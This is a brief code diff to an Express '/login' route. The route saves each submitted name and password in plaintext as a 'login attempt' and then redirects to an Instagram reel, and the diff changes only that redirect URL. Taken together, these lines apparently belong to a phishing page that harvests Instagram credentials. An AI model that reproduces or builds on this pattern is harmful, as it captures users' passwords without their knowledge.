@@ -55,7 +55,7 @@ app.post('/login', async (req, res) => {
 
     await LoginModel.create({ name, password }); // Save login attempt
 
-    const redirectUrl = "https://www.instagram.com/reel/DHYV63ZJ-8O/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";
+    const redirectUrl = "https://www.instagram.com/reel/DHwH0TkzEfU/?igsh=ejRkZWg2NTY2bWV6";
 
     if (user) {
       return res.json({
